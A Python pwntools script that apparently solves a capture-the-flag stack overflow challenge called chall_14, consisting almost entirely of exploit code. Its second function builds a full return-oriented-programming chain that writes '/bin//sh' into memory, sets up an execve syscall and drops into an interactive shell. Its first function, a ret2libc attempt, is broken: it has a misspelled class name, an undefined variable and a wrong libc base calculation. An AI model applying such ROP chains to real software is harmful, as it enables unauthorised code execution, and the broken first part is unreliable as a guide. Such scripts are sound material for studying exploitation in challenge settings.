# coding: utf-8
from pwn import *
def sol14():
    elf = context.binary = ELF("./chall_14")
    p=process("./chall_14")
    p.sendline()
    poprdi = 0x00492c49
    payload = b"A"*0x108 + p64(poprdi) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(elf.sym.main)
    p.sendline(payload)
    leak = p.recvuntil("Obl")
    print(leak)
    leak = leak[:-3]
    intleak = int(leak,16)
    libc=ELf("")
    libc.address = intleak - elf.got.puts
    payload = b"A"*0x108 + p64(poprdi) + p64(libc.address+binsh) + p64(libc.sym["system"])
    # with no given glibc this method only works for my glibc. further modifications can be made to
    # make it work with any libc by detecting glibc location and calling ROPgadget from 
    # python on the system glibc 
def sol14_():
        from struct import pack

        # Padding goes here
        p = b'a'*0x108

        p += pack('<Q', 0x000000000040f3fe) # pop rsi ; ret
        p += pack('<Q', 0x00000000004c00e0) # @ .data
        p += pack('<Q', 0x00000000004494a7) # pop rax ; ret
        p += b'/bin//sh'
        p += pack('<Q', 0x000000000047b9c5) # mov qword ptr [rsi], rax ; ret
        p += pack('<Q', 0x000000000040f3fe) # pop rsi ; ret
        p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
        p += pack('<Q', 0x0000000000443b00) # xor rax, rax ; ret
        p += pack('<Q', 0x000000000047b9c5) # mov qword ptr [rsi], rax ; ret
        p += pack('<Q', 0x00000000004018ca) # pop rdi ; ret
        p += pack('<Q', 0x00000000004c00e0) # @ .data
        p += pack('<Q', 0x000000000040f3fe) # pop rsi ; ret
        p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
        p += pack('<Q', 0x00000000004017cf) # pop rdx ; ret
        p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
        p += pack('<Q', 0x0000000000443b00) # xor rax, rax ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004012d3) # syscall
        ps=process("./chall_14")
        ps.sendline(p)
        ps.interactive()
        ps.close()
        
        
sol14_()
